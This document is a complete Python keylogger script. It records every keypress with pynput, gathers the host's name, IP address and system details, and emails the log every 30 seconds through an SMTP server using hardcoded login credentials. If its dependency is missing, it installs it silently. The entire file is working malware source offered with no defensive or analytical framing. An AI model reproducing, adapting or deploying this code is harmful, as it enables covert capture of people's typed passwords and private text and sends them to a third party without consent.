try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    from pynput import keyboard
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pynput"]
    call("pip install " + ' '.join(modules), shell=True)

finally:
    EMAIL_ADDRESS = "bb991a07c63c4b"
    EMAIL_PASSWORD = "cc4b3ac7640b3b"
    SEND_REPORT_EVERY = 30  # as in seconds

    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "KeyLogger Started..."
            self.email = email
            self.password = password

        def append_log(self, string):
            self.log = self.log + string

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = " SPACE "
                elif key == key.esc:
                    current_key = " ESC "
                else:
                    current_key = " " + str(key) + " "
            self.append_log(current_key)

        def send_mail(self, email, password, message):
            try:
                # Setup email content
                msg = MIMEMultipart()
                msg['From'] = email
                msg['To'] = email  # You can modify this to send to a different receiver
                msg['Subject'] = 'Keylogger Report'
                msg.attach(MIMEText(message, 'plain'))

                # Setup server and send email
                with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                    server.login(email, password)
                    server.send_message(msg)
            except Exception as e:
                print(f"Error sending email: {e}")

        def report(self):
            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()

            self.append_log(f"\nHostname: {hostname}")
            self.append_log(f"\nIP Address: {ip}")
            self.append_log(f"\nProcessor: {plat}")
            self.append_log(f"\nSystem: {system}")
            self.append_log(f"\nMachine: {machine}")

        def run(self):
            # Start keyboard listener for keylogging
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()  # Start sending reports at intervals
                keyboard_listener.join()

    # Initialize the keylogger
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)

    # Collect system information
    keylogger.system_information()

    # Start keylogger
    keylogger.run()
